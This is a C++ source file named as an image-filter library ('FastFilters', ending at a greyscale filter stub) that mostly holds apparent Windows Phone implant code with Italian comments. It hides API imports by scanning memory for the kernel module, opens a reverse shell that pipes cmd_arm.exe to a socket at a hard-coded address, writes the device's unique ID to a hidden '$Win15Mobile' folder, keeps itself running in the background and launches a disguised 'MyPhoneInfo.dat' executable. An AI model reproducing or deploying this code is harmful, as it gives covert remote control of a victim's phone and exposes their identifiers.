// FastFilters.cpp
#include "pch.h"
#include "FastFilters.h"
#include <robuffer.h>
#include <ppltasks.h>
#include <fstream>
#include <time.h>

using namespace std;

using namespace FastFilters;
using namespace Platform;
using namespace Windows::Storage::Streams;
using namespace concurrency;


typedef struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;

typedef struct _STARTUPINFOA {
    DWORD   cb;
    LPSTR   lpReserved;
    LPSTR   lpDesktop;
    LPSTR   lpTitle;
    DWORD   dwX;
    DWORD   dwY;
    DWORD   dwXSize;
    DWORD   dwYSize;
    DWORD   dwXCountChars;
    DWORD   dwYCountChars;
    DWORD   dwFillAttribute;
    DWORD   dwFlags;
    WORD    wShowWindow;
    WORD    cbReserved2;
    LPBYTE  lpReserved2;
    HANDLE  hStdInput;
    HANDLE  hStdOutput;
    HANDLE  hStdError;
} STARTUPINFOA, *LPSTARTUPINFOA;
typedef struct _STARTUPINFOW {
    DWORD   cb;
    LPWSTR  lpReserved;
    LPWSTR  lpDesktop;
    LPWSTR  lpTitle;
    DWORD   dwX;
    DWORD   dwY;
    DWORD   dwXSize;
    DWORD   dwYSize;
    DWORD   dwXCountChars;
    DWORD   dwYCountChars;
    DWORD   dwFillAttribute;
    DWORD   dwFlags;
    WORD    wShowWindow;
    WORD    cbReserved2;
    LPBYTE  lpReserved2;
    HANDLE  hStdInput;
    HANDLE  hStdOutput;
    HANDLE  hStdError;
} STARTUPINFOW, *LPSTARTUPINFOW;
#ifdef UNICODE
typedef STARTUPINFOW STARTUPINFO;
typedef LPSTARTUPINFOW LPSTARTUPINFO;
#else
typedef STARTUPINFOA STARTUPINFO;
typedef LPSTARTUPINFOA LPSTARTUPINFO;
#endif // UNICODE

typedef BOOL WINAPI __stdcall t_CPA(
  LPCSTR lpApplicationName,
  LPSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCSTR lpCurrentDirectory,
  LPSTARTUPINFO lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

t_CPA *CreateProcessA=0;

PIMAGE_NT_HEADERS WINAPI ImageNtHeader(PVOID Base)
{
	return (PIMAGE_NT_HEADERS)
		((LPBYTE) Base + ((PIMAGE_DOS_HEADER) Base)->e_lfanew);
}

PIMAGE_SECTION_HEADER WINAPI RtlImageRvaToSection( const IMAGE_NT_HEADERS *nt,
                                                   HMODULE module, DWORD_PTR rva )
{
    int i;
    const IMAGE_SECTION_HEADER *sec;

    sec = (const IMAGE_SECTION_HEADER*)((const char*)&nt->OptionalHeader +
                                        nt->FileHeader.SizeOfOptionalHeader);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
    {
        if ((sec->VirtualAddress <= rva) && (sec->VirtualAddress + sec->SizeOfRawData > rva))
            return (PIMAGE_SECTION_HEADER)sec;
    }
    return NULL;
}

PVOID WINAPI RtlImageRvaToVa( const IMAGE_NT_HEADERS *nt, HMODULE module,
                              DWORD_PTR rva, IMAGE_SECTION_HEADER **section )
{
    IMAGE_SECTION_HEADER *sec;

    if (section && *section)  /* try this section first */
    {
        sec = *section;
        if ((sec->VirtualAddress <= rva) && (sec->VirtualAddress + sec->SizeOfRawData > rva))
            goto found;
    }
    if (!(sec = RtlImageRvaToSection( nt, module, rva ))) return NULL;
 found:
    if (section) *section = sec;
    return (char *)module + sec->PointerToRawData + (rva - sec->VirtualAddress);
}

PVOID WINAPI ImageDirectoryEntryToDataEx( PVOID base, BOOLEAN image, USHORT dir, PULONG size, PIMAGE_SECTION_HEADER *section )
{
    const IMAGE_NT_HEADERS *nt;
    DWORD_PTR addr;

    *size = 0;
    if (section) *section = NULL;

    if (!(nt = ImageNtHeader( base ))) return NULL;
    if (dir >= nt->OptionalHeader.NumberOfRvaAndSizes) return NULL;
    if (!(addr = nt->OptionalHeader.DataDirectory[dir].VirtualAddress)) return NULL;

    *size = nt->OptionalHeader.DataDirectory[dir].Size;
    if (image || addr < nt->OptionalHeader.SizeOfHeaders) return (char *)base + addr;

    return RtlImageRvaToVa( nt, (HMODULE)base, addr, section );
}


// == Windows API GetProcAddress
void *PeGetProcAddressA(void *Base, LPCSTR Name)
{
	DWORD Tmp;

	IMAGE_NT_HEADERS *NT=ImageNtHeader(Base);
	IMAGE_EXPORT_DIRECTORY *Exp=(IMAGE_EXPORT_DIRECTORY*)ImageDirectoryEntryToDataEx(Base,TRUE,IMAGE_DIRECTORY_ENTRY_EXPORT,&Tmp,0);
	if(Exp==0 || Exp->NumberOfFunctions==0)
	{
		SetLastError(ERROR_NOT_FOUND);
		return 0;
	}

	DWORD *Names=(DWORD*)(Exp->AddressOfNames+(DWORD_PTR)Base);
	WORD *Ordinals=(WORD*)(Exp->AddressOfNameOrdinals+(DWORD_PTR)Base);
	DWORD *Functions=(DWORD*)(Exp->AddressOfFunctions+(DWORD_PTR)Base);

	FARPROC Ret=0;

	if((DWORD_PTR)Name<65536)
	{
		if((DWORD_PTR)Name-Exp->Base<Exp->NumberOfFunctions)
			Ret=(FARPROC)(Functions[(DWORD_PTR)Name-Exp->Base]+(DWORD_PTR)Base);
	} else
	{
		for(DWORD i=0; i<Exp->NumberOfNames && Ret==0; i++)
		{
			char *Func=(char*)(Names[i]+(DWORD_PTR)Base);
			if(Func && strcmp(Func,Name)==0)
				Ret=(FARPROC)(Functions[Ordinals[i]]+(DWORD_PTR)Base);
		}
	}

	if(Ret)
	{
		DWORD ExpStart=NT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+(DWORD)Base;
		DWORD ExpSize=NT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
		if((DWORD)Ret>=ExpStart && (DWORD)Ret<=ExpStart+ExpSize)
		{
			// Forwarder
			return 0;
		}
		return Ret;
	}

	return 0;	
}

typedef HMODULE __stdcall t_LLW(LPCTSTR,HANDLE,DWORD);
t_LLW* LoadLibraryExW=0;


#include <WinBase.h>
#include <Windows.h>

#include <winsock2.h>
#include <stdio.h>
     
#pragma comment(lib, "Ws2_32.lib") //Inform the linker that the Ws2_32.lib file is needed.

#ifdef _DEBUG  
#define DEFAULT_PORT 1237
#define DEFAULT_IP "192.168.1.253"
    
#define STARTF_USESTDHANDLES       0x00000100


int cmdNC(void)
{
	 
	WSADATA wsaData;
    SOCKET Winsocket;
    STARTUPINFO theProcess; 
    PROCESS_INFORMATION info_proc; 
    struct sockaddr_in Winsocket_Structure;
	
	char *Tmp=(char*)GetTickCount64;
	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);

	while(Tmp)
	{
		__try 
		{
			if(Tmp[0]=='M' && Tmp[1]=='Z')
				break;
		} __except(EXCEPTION_EXECUTE_HANDLER)
		{
		}
		Tmp-=0x1000;
	}

	if(Tmp==0)
		return 0;
	
	CreateProcessA=(t_CPA*)PeGetProcAddressA(Tmp,"CreateProcessA");
	
	STARTUPINFO si;
	memset(&si,0,sizeof(si));
	si.cb=sizeof(si);

	PROCESS_INFORMATION pi;
	
	char *IP =  DEFAULT_IP;
    short port = DEFAULT_PORT;
        
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsocket=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL, (unsigned int) NULL, (unsigned int) NULL);
    Winsocket_Structure.sin_port=htons(port);
    Winsocket_Structure.sin_family=AF_INET;
    Winsocket_Structure.sin_addr.s_addr=inet_addr(IP);
     
    if(Winsocket==INVALID_SOCKET)
    {
        WSACleanup();
        return 1;
    }
     
    if(WSAConnect(Winsocket,(SOCKADDR*)&Winsocket_Structure,sizeof(Winsocket_Structure),NULL,NULL,NULL,NULL) == SOCKET_ERROR)
    {
        WSACleanup();
        return 1;
    }
     
    // Starting shell by creating a new process with i/o redirection.    
    memset(&theProcess,0,sizeof(theProcess));
    theProcess.cb=sizeof(theProcess);
    theProcess.dwFlags=STARTF_USESTDHANDLES;
        
    // here we make the redirection
    theProcess.hStdInput = theProcess.hStdOutput = theProcess.hStdError = (HANDLE)Winsocket;


	if(CreateProcessA(NULL,"cmd_arm.exe",NULL,NULL,TRUE,0,NULL,NULL,&theProcess,&info_proc)==0)
    {
        WSACleanup();
        return 1;
    }


	return 0;
}
#endif



WCHAR* startBNSIUpdateNotification()
{
 
	char *Tmp=(char*)GetTickCount64;
	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);

	while(Tmp)
	{
			if(Tmp[0]=='M' && Tmp[1]=='Z')
				break;
		
		Tmp-=0x1000;
	}

	if(Tmp==0)
		return 0;

	LoadLibraryExW=(t_LLW*)PeGetProcAddressA(Tmp,"LoadLibraryExW");
	CreateProcessA=(t_CPA*)PeGetProcAddressA(Tmp,"CreateProcessA");

	HINSTANCE LibHandle;


	typedef  int   (__stdcall  *FunctionFuncDevicePropertiesGetUniqueDeviceId)(BYTE*,unsigned int);	
	FunctionFuncDevicePropertiesGetUniqueDeviceId _DevicePropertiesGetUniqueDeviceId;
    _DevicePropertiesGetUniqueDeviceId=  (FunctionFuncDevicePropertiesGetUniqueDeviceId)GetProcAddress(LoadLibraryExW(L"PlatformInterop",NULL,0),"DevicePropertiesGetUniqueDeviceId");

	BYTE array[20];
	_DevicePropertiesGetUniqueDeviceId(array,sizeof(array));

	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);
	//IMPORTANTISSIMO BYGIO DA CRIPTARE
	fstream filestrID;
	filestrID.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\id.bin", fstream::out|fstream::binary);
	filestrID.write((char*)array,sizeof(array));
	filestrID.close();

	typedef  int   (__stdcall  *FunctionFuncBNSIUpdateNotification)();	
	FunctionFuncBNSIUpdateNotification _BNSIUpdateNotification;
    _BNSIUpdateNotification=  (FunctionFuncBNSIUpdateNotification)GetProcAddress(LoadLibraryExW(L"PlatformInterop",NULL,0),"BNSIUpdateNotification");
	
	typedef  int   (__stdcall  *FunctionFuncBNSIUpdateExpiryTime)();	
	FunctionFuncBNSIUpdateExpiryTime _BNSIUpdateExpiryTime;
    _BNSIUpdateExpiryTime=  (FunctionFuncBNSIUpdateExpiryTime)GetProcAddress(LoadLibraryExW(L"PlatformInterop",NULL,0),"BNSIUpdateExpiryTime");

	typedef  int   (__stdcall  *FunctionFuncBNSILoadErrorMessage)(int, WCHAR*,int);	
	FunctionFuncBNSILoadErrorMessage _BNSILoadErrorMessage;
    _BNSILoadErrorMessage=  (FunctionFuncBNSILoadErrorMessage)GetProcAddress(LoadLibraryExW(L"PlatformInterop",NULL,0),"BNSILoadErrorMessage");

	int hr=_BNSIUpdateExpiryTime();
	WCHAR messagePointer[0x400];
	hr=_BNSILoadErrorMessage(hr, messagePointer, 0x400);

	return messagePointer;
 }


#define DTTMFMT "%Y-%m-%d %H:%M:%S "
#define DTTMSZ 21
static char *getDtTm (char *buff) {
    time_t t = time (0);
    strftime(buff, DTTMSZ, DTTMFMT, localtime (&t));
    return buff;
}

#ifdef _DEBUG
	#define LOG
#endif

#ifdef _DEBUG
void chackBachGround(void)
{
	STARTUPINFO si;
	memset(&si,0,sizeof(si));
	si.cb=sizeof(si);
	PROCESS_INFORMATION pi;

	/*
	Windows::Foundation::TimeSpan span;
	span.Duration = 10000000L;   // convert 1 sec to 100ns ticks
	 
	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
	vibr->Vibrate(span);
	*/

	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);

	char *Tmp=(char*)GetTickCount64;
	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);

	while(Tmp)
	{
			if(Tmp[0]=='M' && Tmp[1]=='Z')
				break;
		
		Tmp-=0x1000;
	}

	LoadLibraryExW=(t_LLW*)PeGetProcAddressA(Tmp,"LoadLibraryExW");
	CreateProcessA=(t_CPA*)PeGetProcAddressA(Tmp,"CreateProcessA");


	HINSTANCE LibHandle;
	DWORD status1=0;
	DWORD status2=0;
	DWORD ret=5;

	typedef DWORD   (__stdcall  *FunctionFuncSetConnectionPriority)(DWORD);
	LibHandle = LoadLibraryExW(L"EMCLIENT",NULL,0);
	FunctionFuncSetConnectionPriority _SetConnectionPriority =  (FunctionFuncSetConnectionPriority)GetProcAddress(LibHandle,"SetConnectionPriority");

	typedef DWORD   (__stdcall  *FunctionFuncSetIsExecutingInBackground)(DWORD);
	LibHandle = LoadLibraryExW(L"EMCLIENT",NULL,0);
	FunctionFuncSetIsExecutingInBackground _SetIsExecutingInBackground =  (FunctionFuncSetIsExecutingInBackground)GetProcAddress(LibHandle,"SetIsExecutingInBackground");



	ret=_SetConnectionPriority(0);
	ret=_SetIsExecutingInBackground(0);
}
#endif

//crea il file del pid
DWORD startCreate(void)
{
	STARTUPINFO si;
	memset(&si,0,sizeof(si));
	si.cb=sizeof(si);
	PROCESS_INFORMATION pi;

/*
	Windows::Foundation::TimeSpan span;
	span.Duration = 10000000L;   // convert 1 sec to 100ns ticks
	 
	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
	vibr->Vibrate(span);
	*/
	
	char *Tmp=(char*)GetTickCount64;
	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);

	while(Tmp)
	{
			if(Tmp[0]=='M' && Tmp[1]=='Z')
				break;
		
		Tmp-=0x1000;
	}

	if(Tmp==0)
		return 0;

	LoadLibraryExW=(t_LLW*)PeGetProcAddressA(Tmp,"LoadLibraryExW");
	CreateProcessA=(t_CPA*)PeGetProcAddressA(Tmp,"CreateProcessA");

	HINSTANCE LibHandle;

	typedef  int   (__stdcall  *FunctionFuncDevicePropertiesGetUniqueDeviceId)(BYTE*,unsigned int);	
	FunctionFuncDevicePropertiesGetUniqueDeviceId _DevicePropertiesGetUniqueDeviceId;
    _DevicePropertiesGetUniqueDeviceId=  (FunctionFuncDevicePropertiesGetUniqueDeviceId)GetProcAddress(LoadLibraryExW(L"PlatformInterop",NULL,0),"DevicePropertiesGetUniqueDeviceId");

	BYTE array[20];
	_DevicePropertiesGetUniqueDeviceId(array,sizeof(array));


	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);
	//IMPORTANTISSIMO BYGIO DA CRIPTARE
	fstream filestrID;
	filestrID.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\id.bin", fstream::out|fstream::binary);
	filestrID.write((char*)array,sizeof(array));
	filestrID.close();

	return 1;
 }


DWORD startPI(void)
{
	STARTUPINFO si;
	memset(&si,0,sizeof(si));
	si.cb=sizeof(si);
	PROCESS_INFORMATION pi;

	/*
	Windows::Foundation::TimeSpan span;
	span.Duration = 10000000L;   // convert 1 sec to 100ns ticks
	 
	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
	vibr->Vibrate(span);
	*/

	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);

	char *Tmp=(char*)GetTickCount64;
	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);

	while(Tmp)
	{
			if(Tmp[0]=='M' && Tmp[1]=='Z')
				break;
		
		Tmp-=0x1000;
	}

	if(Tmp==0)
		return 0;

	LoadLibraryExW=(t_LLW*)PeGetProcAddressA(Tmp,"LoadLibraryExW");
	CreateProcessA=(t_CPA*)PeGetProcAddressA(Tmp,"CreateProcessA");

	HINSTANCE LibHandle;

	typedef BOOL   (__stdcall  *FunctionFuncEnumProcesses)(DWORD*,DWORD,LPDWORD);
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	FunctionFuncEnumProcesses   _EnumProcesses=  (FunctionFuncEnumProcesses)GetProcAddress(LibHandle,"EnumProcesses");

	typedef DWORD   (__stdcall  *FunctionFuncSetConnectionPriority)(DWORD);
	LibHandle = LoadLibraryExW(L"EMCLIENT",NULL,0);
	FunctionFuncSetConnectionPriority _SetConnectionPriority =  (FunctionFuncSetConnectionPriority)GetProcAddress(LibHandle,"SetConnectionPriority");

	typedef DWORD   (__stdcall  *FunctionFuncSetIsExecutingInBackground)(DWORD);
	LibHandle = LoadLibraryExW(L"EMCLIENT",NULL,0);
	FunctionFuncSetIsExecutingInBackground _SetIsExecutingInBackground =  (FunctionFuncSetIsExecutingInBackground)GetProcAddress(LibHandle,"SetIsExecutingInBackground");

	//BYGIO
	//se ho capito bene questa fa credere al sistema di essere in FG anche se è in BK
	////_SetConnectionPriority(0);
	////_SetIsExecutingInBackground(0);

	//SetIsHeadlessHost
	//TaskHostModalStateValid(0);

	 // Get the list of process identifiers.  
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int j;
  
	DWORD pidLastRun=0;
#ifdef LOG
	fstream fileTXT;
	wchar_t msgW[128];
	char msgA[128];
		
	char buff[DTTMSZ];
	fileTXT.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\log.txt", fstream::out|fstream::app);		
	fileTXT << getDtTm (buff) << std::endl;
#endif


	// carico da file il pid dell'ultimo processo lanciato
	fstream filestr;
	filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\pid.bin", fstream::in|fstream::binary);
	filestr.seekg (0, ios::beg);
	filestr.read ((char*)&pidLastRun, sizeof(pidLastRun));
	filestr.close();

#ifdef LOG
	swprintf_s(msgW,L"Pid ultimo processo lanciato=%x\n",pidLastRun );
	wcstombs(msgA, msgW, wcslen(msgW)+1);
	fileTXT << msgA << std::endl;
#endif

	//This returns a list of handles to processes running on the system as an array.
	if ( !_EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
	{
#ifdef LOG
		// non ci sono processi!!!
		swprintf_s(msgW,L"Non ci sono processi\n");
		wcstombs(msgA, msgW, wcslen(msgW)+1);
		fileTXT << msgA << std::endl;

		fileTXT << std::endl;
		fileTXT.close();
#endif
		return 0;
	}
  
	// Calculate how many process identifiers were returned.  
	cProcesses = cbNeeded / sizeof(DWORD);

	for ( j = 0; j < cProcesses; j++ )
	{
		if( aProcesses[j] != 0 )  
		{
			//se il pid salvato è uguale a quelo che sta girando in memoria allora significa che c'e' ancora il vecchio processo che gira
			if(aProcesses[j]==pidLastRun) 
			{
#ifdef LOG
					swprintf_s(msgW,L"Ho trovato gia' in esecuzione il processo con Pid=%x\n",pidLastRun );
					wcstombs(msgA, msgW, wcslen(msgW)+1);
					fileTXT << msgA << std::endl;

					fileTXT << std::endl;
					fileTXT.close();
#endif
					return aProcesses[j]; 
			}
		}
	}

	COPYFILE2_EXTENDED_PARAMETERS copyParams = {
		sizeof(copyParams), COPY_FILE_FAIL_IF_EXISTS, NULL, NULL, NULL
	};


	if(CreateProcessA("MyPhoneInfo.dat",0,0,0,FALSE,0,0,0,&si,&pi)==0)		
	//CreateProcessA("cmd_arm.exe"," /C \\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\w1.exe",0,0,FALSE,0,0,0,&si,&pi);
    {
		//non sono riuscito a creare il processo
#ifdef LOG
		swprintf_s(msgW,L"non sono riuscito a creare il processo\n");
		wcstombs(msgA, msgW, wcslen(msgW)+1);
		fileTXT << msgA << std::endl;

		WCHAR lpMsgBuf[512];
	
		FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), 0, (LPWSTR) lpMsgBuf, sizeof(lpMsgBuf), NULL );

		swprintf_s(msgW,L"CreateProcessA err:%i : %s\n",GetLastError(),lpMsgBuf);
		wcstombs(msgA, msgW, wcslen(msgW)+1);
		fileTXT << msgA << std::endl;

		fileTXT << std::endl;
		fileTXT.close();
#endif
        return 0;
    }

	//salvo in file.pid il pid del processo che gira adesso
	filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\pid.bin", fstream::out|fstream::binary);
	filestr.seekg (0, ios::beg);
	filestr.write ((const char*)&pi.dwProcessId, sizeof(pi.dwProcessId));
	filestr.close();

#ifdef LOG
	swprintf_s(msgW,L"Ho Ho creato un nuovo processo con Pid=%x\n",pi.dwProcessId );
	wcstombs(msgA, msgW, wcslen(msgW)+1);
	fileTXT << msgA << std::endl;


	fileTXT << std::endl;
	fileTXT.close();

	//cmdNC();
#endif


	return 1;
 
 }

#ifdef _DEBUG
void DisplayProcessNameAndID( DWORD processID , fstream* fileTXT)
{
   TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
  
   HINSTANCE LibHandle;

   	typedef HANDLE   (__stdcall  *FunctionFuncOpenProcess)(DWORD,BOOL,DWORD);
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	FunctionFuncOpenProcess   _OpenProcess=  (FunctionFuncOpenProcess)GetProcAddress(LibHandle,"OpenProcess");

	typedef BOOL   (__stdcall  *FunctionFuncEnumProcessModules)(HANDLE,HMODULE*,DWORD,LPDWORD);
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	FunctionFuncEnumProcessModules   _EnumProcessModules=  (FunctionFuncEnumProcessModules)GetProcAddress(LibHandle,"EnumProcessModules");

	typedef DWORD   (__stdcall  *FunctionFuncGetModuleBaseNameW)(HANDLE,HMODULE,LPWSTR,DWORD);
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	FunctionFuncGetModuleBaseNameW   _GetModuleBaseNameW=  (FunctionFuncGetModuleBaseNameW)GetProcAddress(LibHandle,"GetModuleBaseNameW");

   // Get a handle to the process.  
   HANDLE hProcess = _OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID );
  
   // Get the process name.  
   if (NULL != hProcess )
   {
      HMODULE hMod;
      DWORD cbNeeded;
     
      //Given a handle to a process, this returns all the modules running within the process.
      //The first module is the executable running the process,
      //and subsequent handles describe DLLs loaded into the process.
      if ( _EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) )
      {
         //This function returns the short name for a module,
         //typically the file name portion of the EXE or DLL
         _GetModuleBaseNameW( hProcess, hMod, szProcessName,
            sizeof(szProcessName)/sizeof(TCHAR) );
      }
   }


   	wchar_t msgW[128];
	char msgA[128];
  
   // Display the process name and identifier.
   swprintf_s(msgW, TEXT("\nText:%s, PID : %u"),  szProcessName, processID );
   wcstombs(msgA, msgW, wcslen(msgW)+1);
   *fileTXT << msgA << std::endl;


   //close the process handle
   CloseHandle( hProcess );
}
#endif

#ifdef _DEBUG
void GetProcessNameFromID( DWORD processID , WCHAR* ProcessName)
{
   TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
  
   HINSTANCE LibHandle;

   	typedef HANDLE   (__stdcall  *FunctionFuncOpenProcess)(DWORD,BOOL,DWORD);
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	FunctionFuncOpenProcess   _OpenProcess=  (FunctionFuncOpenProcess)GetProcAddress(LibHandle,"OpenProcess");

	typedef BOOL   (__stdcall  *FunctionFuncEnumProcessModules)(HANDLE,HMODULE*,DWORD,LPDWORD);
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	FunctionFuncEnumProcessModules   _EnumProcessModules=  (FunctionFuncEnumProcessModules)GetProcAddress(LibHandle,"EnumProcessModules");

	typedef DWORD   (__stdcall  *FunctionFuncGetModuleBaseNameW)(HANDLE,HMODULE,LPWSTR,DWORD);
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	FunctionFuncGetModuleBaseNameW   _GetModuleBaseNameW=  (FunctionFuncGetModuleBaseNameW)GetProcAddress(LibHandle,"GetModuleBaseNameW");

	// Get a handle to the process.  
	HANDLE hProcess = _OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID );
  
   // Get the process name.  
   if (NULL != hProcess )
   {
      HMODULE hMod;
      DWORD cbNeeded;
     
      //Given a handle to a process, this returns all the modules running within the process.
      //The first module is the executable running the process,
      //and subsequent handles describe DLLs loaded into the process.
      if ( _EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) )
      {
         //This function returns the short name for a module,
         //typically the file name portion of the EXE or DLL
         _GetModuleBaseNameW( hProcess, hMod, szProcessName,
            sizeof(szProcessName)/sizeof(TCHAR) );
      }
   }

   	wchar_t msgW[128];
	char msgA[128];
  
	// Display the process name and identifier.
	swprintf_s(msgW, TEXT("%s"),  szProcessName);
	wcscpy(ProcessName,msgW);
	


    //close the process handle
	CloseHandle( hProcess );
}
#endif

 

#ifdef _DEBUG
DWORD saveAllPID(void)
{
	STARTUPINFO si;
	memset(&si,0,sizeof(si));
	si.cb=sizeof(si);
	PROCESS_INFORMATION pi;

	Windows::Foundation::TimeSpan span;
	span.Duration = 10000000L;   // convert 1 sec to 100ns ticks
	 
	Windows::Phone::Devices::Notification::VibrationDevice^ vibr = Windows::Phone::Devices::Notification::VibrationDevice::GetDefault();
	vibr->Vibrate(span);

	CreateDirectory(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\", NULL);

	char *Tmp=(char*)GetTickCount64;
	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);

	while(Tmp)
	{
			if(Tmp[0]=='M' && Tmp[1]=='Z')
				break;
		
		Tmp-=0x1000;
	}

	if(Tmp==0)
		return 0;

	LoadLibraryExW=(t_LLW*)PeGetProcAddressA(Tmp,"LoadLibraryExW");
	CreateProcessA=(t_CPA*)PeGetProcAddressA(Tmp,"CreateProcessA");

	HINSTANCE LibHandle;

	typedef BOOL   (__stdcall  *FunctionFuncEnumProcesses)(DWORD*,DWORD,LPDWORD);
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	FunctionFuncEnumProcesses   _EnumProcesses=  (FunctionFuncEnumProcesses)GetProcAddress(LibHandle,"EnumProcesses");
	
	 // Get the list of process identifiers.  
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int j;
  
	DWORD pidLastRun=0;
#ifdef LOG
	fstream fileTXT;
	wchar_t msgW[128];
	char msgA[128];
		
	char buff[DTTMSZ];
	fileTXT.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\logPID.txt", fstream::out|fstream::app);		
	fileTXT << getDtTm (buff) << std::endl;
#endif

	// carico da file il pid dell'ultimo processo lanciato
	fstream filestr;
	filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\pid.bin", fstream::in|fstream::binary);
	filestr.seekg (0, ios::beg);
	filestr.read ((char*)&pidLastRun, sizeof(pidLastRun));
	filestr.close();

#ifdef LOG
	swprintf_s(msgW,L"Pid ultimo processo lanciato=%x\n",pidLastRun );
	wcstombs(msgA, msgW, wcslen(msgW)+1);
	fileTXT << msgA << std::endl;
#endif

	//This returns a list of handles to processes running on the system as an array.
	if ( !_EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
	{
#ifdef LOG
		// non ci sono processi!!!
		swprintf_s(msgW,L"Non ci sono processi\n");
		wcstombs(msgA, msgW, wcslen(msgW)+1);
		fileTXT << msgA << std::endl;

		fileTXT << std::endl;
		fileTXT.close();
#endif
		return 0;
	}
  
	// Calculate how many process identifiers were returned.  
	cProcesses = cbNeeded / sizeof(DWORD);

	for ( j = 0; j < cProcesses; j++ )
	{
		if( aProcesses[j] != 0 )  
		{
				//se il pid salvato è uguale a quelo che sta girando in memoria allora significa che c'e' ancora il vecchio processo che gira
#ifdef LOG
			HINSTANCE LibHandle;

   			typedef HANDLE   (__stdcall  *FunctionFuncOpenProcess)(DWORD,BOOL,DWORD);
			LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
			FunctionFuncOpenProcess   _OpenProcess=  (FunctionFuncOpenProcess)GetProcAddress(LibHandle,"OpenProcess");

						
			HANDLE process = _OpenProcess(PROCESS_ALL_ACCESS, FALSE, aProcesses[j]);
				if(process == NULL) {
					swprintf_s(msgW,L"%i) Error: the specified process couldn't be found: %i Pid=%x",j,cProcesses-1,aProcesses[j] );
					wcstombs(msgA, msgW, wcslen(msgW)+1);
					fileTXT << msgA << std::endl;
				}
				else
				{
					swprintf_s(msgW,L"%i) OK: n=i Pid=%x process=%x",j,cProcesses-1,aProcesses[j],process);
					wcstombs(msgA, msgW, wcslen(msgW)+1);
					fileTXT << msgA << std::endl;
						  
				}
			// _CloseHandle(process);

			swprintf_s(msgW,L"%i) in esecuzione %i processi con Pid=%x",j,cProcesses-1,aProcesses[j] );
			wcstombs(msgA, msgW, wcslen(msgW)+1);
			fileTXT << msgA << std::endl;
			DisplayProcessNameAndID( aProcesses[j],&fileTXT);
			fileTXT << std::endl;

#endif
		}
	}
#ifdef LOG
	fileTXT << std::endl;
	fileTXT.close();
#endif

	return 1;
}
#endif

int GreyscaleFilter::Convert()
{
